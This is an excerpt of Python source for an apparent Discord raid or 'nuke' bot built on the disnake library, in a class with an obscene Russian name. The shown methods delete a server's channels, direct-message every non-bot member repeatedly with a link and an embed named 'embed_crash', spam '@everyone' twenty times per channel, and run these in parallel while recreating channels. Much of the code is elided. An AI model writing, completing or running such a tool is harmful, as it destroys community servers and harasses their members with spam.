...
class pizda_vsemu:
    ...
    async def remove_all_channels(
        self, inter: disnake.Interaction, bot: disnake.Client
    ):
        guild = inter.guild
            ...
            async for member in guild.fetch_members(limit=None):
                if member.bot == False:
                    for i in range(0,5):
                        ...
                        await urs.send(content = f"<@{member.id}> {discord_link}", embed=disnake.Embed.from_dict(embed_crash))
    ...
    async def send_embeds(self, channel):
        for i in range(0, 20):
            await channel.send(content=f"@everyone {discord_link}", embed=disnake.Embed.from_dict(embed_crash))
        return
    ...
    async def make_channels(self, inter: disnake.Interaction, bot: disnake.Client):
        guild = inter.guild
    ...
    async def mani_task(self, inter: disnake.Interaction, bot: disnake.Client):
        ...
        asyncio.run_coroutine_threadsafe(pizda_vsemu().member_send_dm_message(inter), loop_3)
        asyncio.run_coroutine_threadsafe(
            pizda_vsemu().remove_all_channels(inter, bot), loop
        )

        await inter.edit_original_message(content="Удалил каналы!")
        asyncio.run_coroutine_threadsafe(
            pizda_vsemu().make_channels(inter, bot), loop_2
        )
